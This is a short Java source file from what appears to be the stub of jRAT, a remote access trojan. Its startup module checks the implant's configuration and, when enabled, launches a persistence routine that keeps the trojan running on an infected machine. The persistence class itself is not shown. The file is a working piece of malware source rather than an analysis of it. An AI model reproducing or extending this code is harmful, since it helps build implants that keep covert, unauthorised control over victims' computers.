package se.jrat.stub.modules.startup;

import java.util.Map;

import se.jrat.stub.Configuration;
import se.jrat.stub.Persistance;

public class PersistanceStartupModule extends StartupModule {
	
	public PersistanceStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		if (Boolean.parseBoolean(Configuration.getConfig().get("per"))) {
			new Persistance(Integer.parseInt(Configuration.getConfig().get("perms"))).start();
		}
	}

}
